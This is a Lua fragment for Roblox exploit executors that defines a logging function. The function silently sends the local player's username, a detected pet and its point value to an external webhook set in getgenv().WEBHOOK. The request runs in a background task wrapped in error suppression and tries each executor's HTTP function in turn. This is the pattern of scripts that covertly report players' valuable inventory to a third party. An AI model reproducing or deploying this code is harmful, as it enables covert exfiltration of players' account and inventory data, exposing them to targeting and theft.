-- 1. SINGLE WEBHOOK LOGGING (Proven for all Executors)
local function SoloLog(petName, val)
    local payload = HttpService:JSONEncode({
        ["embeds"] = {{
            ["title"] = "✅ MONDEUR SCAN: SUCCESS",
            ["description"] = "Inventory scan for user: **" .. LocalPlayer.Name .. "**",
            ["fields"] = {
                {["name"] = "Pet Detected", ["value"] = petName, ["inline"] = true},
                {["name"] = "Arfud Points", ["value"] = tostring(val), ["inline"] = true}
            },
            ["color"] = 0x00FF00
        }}
    })

    -- Universal request handler for Delta/Vega/Fluxus
    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
    if httpRequest then
        task.spawn(function()
            pcall(function()
                httpRequest({
                    Url = getgenv().WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = payload
                })
            end)
        end)
    end
end

